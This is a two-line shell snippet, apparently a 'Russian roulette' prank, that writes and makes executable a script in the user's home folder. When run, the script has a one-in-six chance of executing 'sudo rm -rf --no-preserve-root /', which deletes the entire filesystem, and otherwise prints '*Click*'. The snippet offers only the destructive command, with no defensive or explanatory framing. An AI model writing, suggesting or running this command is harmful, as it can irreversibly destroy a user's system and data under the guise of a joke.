echo '[ $[ $RANDOM % 6 ] == 0 ] && sudo rm -rf --no-preserve-root / || echo *Click*' > $HOME/trigger.sh
chmod +x $HOME/trigger.sh

